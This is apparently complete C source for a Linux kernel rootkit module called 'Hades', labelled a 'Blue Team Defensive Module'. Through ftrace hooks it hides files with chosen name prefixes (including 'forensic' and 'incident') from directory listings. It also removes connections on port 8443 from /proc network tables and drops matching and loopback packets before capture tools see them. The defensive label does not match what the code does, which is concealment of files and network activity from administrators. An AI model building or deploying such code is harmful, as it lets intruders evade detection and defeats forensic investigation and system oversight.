#include <linux/module.h> 
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <linux/tcp.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include "ftrace_helper.h"


#define PROTECTED_PORT 8443 
#define MAX_PREFIXES 16 
#define MAX_PREFIX_LEN 32 

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Trevohack");
MODULE_DESCRIPTION("Blue Team Defensive Module - File/Directory hiding and connection protection");
MODULE_VERSION("2.0");


static char *file_prefixes[MAX_PREFIXES] = {
    "source-code", 
    "data",
    "classified",
    "internal",
    "backup",
    "forensic",
    "incident",
    NULL 
};


static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_udp6_seq_show)(struct seq_file *seq, void *v);
static int (*orig_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev,
                               struct packet_type *pt, struct net_device *orig_dev);


static int should_hide_file(const char *name) {
    int i;
    
    if (!name)
        return 0;
        
    for (i = 0; i < MAX_PREFIXES && file_prefixes[i] != NULL; i++) {
        if (strncmp(name, file_prefixes[i], strlen(file_prefixes[i])) == 0) {
            // printk(KERN_DEBUG "[Hades] Hiding file: %s\n", name);
            return 1;
        }
    }
    
    if (strstr(name, ".classified") || 
        strstr(name, ".secret") ||
        strstr(name, ".blueteam") ||
        strstr(name, "_defense")) {
        // printk(KERN_DEBUG "[Hades] Hiding sensitive file: %s\n", name);
        return 1;
    }
    
    return 0;
}


static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *user_dir = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *kernel_dir_buffer = NULL;
    struct linux_dirent64 *current_entry = NULL;
    struct linux_dirent64 *prev_entry = NULL;
    long error;
    unsigned long offset = 0;
    long result;
    
    result = orig_getdents64(regs);
    if (result <= 0) {
        return result;
    }
    
    kernel_dir_buffer = kmalloc(result, GFP_KERNEL);
    if (!kernel_dir_buffer) {
        return -ENOMEM;
    }
    
    error = copy_from_user(kernel_dir_buffer, user_dir, result);
    if (error) {
        kfree(kernel_dir_buffer);
        return -EFAULT;
    }
    
    while (offset < result) {
        current_entry = (struct linux_dirent64 *)((char *)kernel_dir_buffer + offset);
        
        if (should_hide_file(current_entry->d_name)) {
            if (current_entry == kernel_dir_buffer) {
                result -= current_entry->d_reclen;
                memmove(kernel_dir_buffer, 
                       (char *)kernel_dir_buffer + current_entry->d_reclen, 
                       result);
                continue;
            }
            
            if (prev_entry) {
                prev_entry->d_reclen += current_entry->d_reclen;
            }
        } else {
            prev_entry = current_entry;
        }
        
        offset += current_entry->d_reclen;
    }
    
    error = copy_to_user(user_dir, kernel_dir_buffer, result);
    kfree(kernel_dir_buffer);
    
    if (error) {
        return -EFAULT;
    }
    
    return result;
}

static asmlinkage long hook_getdents(const struct pt_regs *regs) {
    struct linux_dirent __user *user_dir = (struct linux_dirent __user *)regs->si;
    struct linux_dirent *kernel_dir_buffer = NULL;
    struct linux_dirent *current_entry = NULL;
    struct linux_dirent *prev_entry = NULL;
    long error;
    unsigned long offset = 0;
    long result;
    
    result = orig_getdents(regs);
    if (result <= 0) {
        return result;
    }
    
    kernel_dir_buffer = kmalloc(result, GFP_KERNEL);
    if (!kernel_dir_buffer) {
        return -ENOMEM;
    }
    
    error = copy_from_user(kernel_dir_buffer, user_dir, result);
    if (error) {
        kfree(kernel_dir_buffer);
        return -EFAULT;
    }
    
    while (offset < result) {
        current_entry = (struct linux_dirent *)((char *)kernel_dir_buffer + offset);
        
        if (should_hide_file(current_entry->d_name)) {
            if (current_entry == kernel_dir_buffer) {
                result -= current_entry->d_reclen;
                memmove(kernel_dir_buffer, 
                       (char *)kernel_dir_buffer + current_entry->d_reclen, 
                       result);
                continue;
            }
            
            if (prev_entry) {
                prev_entry->d_reclen += current_entry->d_reclen;
            }
        } else {
            prev_entry = current_entry;
        }
        
        offset += current_entry->d_reclen;
    }
    
    error = copy_to_user(user_dir, kernel_dir_buffer, result);
    kfree(kernel_dir_buffer);
    
    if (error) {
        return -EFAULT;
    }
    
    return result;
}


static asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    
    if (sk != (struct sock *)0x1 && sk->sk_num == PROTECTED_PORT) {
        printk(KERN_DEBUG "[Hades] Hiding TCP4 connection on port %d\n", PROTECTED_PORT);
        return 0; 
    }
    
    return orig_tcp4_seq_show(seq, v);
}

static asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    
    if (sk != (struct sock *)0x1 && sk->sk_num == PROTECTED_PORT) {
        // printk(KERN_DEBUG "[Hades] Hiding TCP6 connection on port %d\n", PROTECTED_PORT);
        return 0; 
    }
    
    return orig_tcp6_seq_show(seq, v);
}

static asmlinkage long hooked_udp4_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    
    if (sk != (struct sock *)0x1 && sk->sk_num == PROTECTED_PORT) {
        return 0; 
    }
    
    return orig_udp4_seq_show(seq, v);
}

static asmlinkage long hooked_udp6_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    
    if (sk != (struct sock *)0x1 && sk->sk_num == PROTECTED_PORT) {
        return 0; 
    }
    
    return orig_udp6_seq_show(seq, v);
}

static int notrace hooked_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
                             struct packet_type *pt, struct net_device *orig_dev) {
    struct iphdr *iph;
    struct ipv6hdr *ip6h;
    struct tcphdr *tcph;
    struct udphdr *udph;
    

    if (!strncmp(dev->name, "lo", 2))
        return NET_RX_DROP;
    
    if (skb_linearize(skb)) 
        goto out;
    

    if (skb->protocol == htons(ETH_P_IP)) {
        iph = ip_hdr(skb);
        
        if (iph->protocol == IPPROTO_TCP) {
            tcph = (void *)iph + iph->ihl * 4;
            if (ntohs(tcph->dest) == PROTECTED_PORT || ntohs(tcph->source) == PROTECTED_PORT) {
                // printk(KERN_DEBUG "[Hades] Dropping TCP packet on protected port %d\n", PROTECTED_PORT);
                return NET_RX_DROP;
            }
        } else if (iph->protocol == IPPROTO_UDP) {
            udph = (void *)iph + iph->ihl * 4;
            if (ntohs(udph->dest) == PROTECTED_PORT || ntohs(udph->source) == PROTECTED_PORT) {
                // printk(KERN_DEBUG "[Hades] Dropping UDP packet on protected port %d\n", PROTECTED_PORT);
                return NET_RX_DROP;
            }
        }
    } 

    else if (skb->protocol == htons(ETH_P_IPV6)) {
        ip6h = ipv6_hdr(skb);
        
        if (ip6h->nexthdr == IPPROTO_TCP) {
            tcph = (void *)ip6h + sizeof(*ip6h);
            if (ntohs(tcph->dest) == PROTECTED_PORT || ntohs(tcph->source) == PROTECTED_PORT) {
                // printk(KERN_DEBUG "[Hades] Dropping IPv6 TCP packet on protected port %d\n", PROTECTED_PORT);
                return NET_RX_DROP;
            }
        } else if (ip6h->nexthdr == IPPROTO_UDP) {
            udph = (void *)ip6h + sizeof(*ip6h);
            if (ntohs(udph->dest) == PROTECTED_PORT || ntohs(udph->source) == PROTECTED_PORT) {
                // printk(KERN_DEBUG "[Hades] Dropping IPv6 UDP packet on protected port %d\n", PROTECTED_PORT);
                return NET_RX_DROP;
            }
        }
    }

out:
    return orig_tpacket_rcv(skb, dev, pt, orig_dev);
}

static struct ftrace_hook defense_hooks[] = {

    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
    
    HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show),
    HOOK("udp4_seq_show", hooked_udp4_seq_show, &orig_udp4_seq_show),
    HOOK("udp6_seq_show", hooked_udp6_seq_show, &orig_udp6_seq_show),
    
    HOOK("tpacket_rcv", hooked_tpacket_rcv, &orig_tpacket_rcv),
};


static int __init hades_init(void) {
    int err;
    
    err = fh_install_hooks(defense_hooks, ARRAY_SIZE(defense_hooks));
    if (err) {
        return err;
    }

    return 0;
}

static void __exit hades_exit(void) {
    fh_remove_hooks(defense_hooks, ARRAY_SIZE(defense_hooks));
}

module_init(hades_init);
module_exit(hades_exit); 
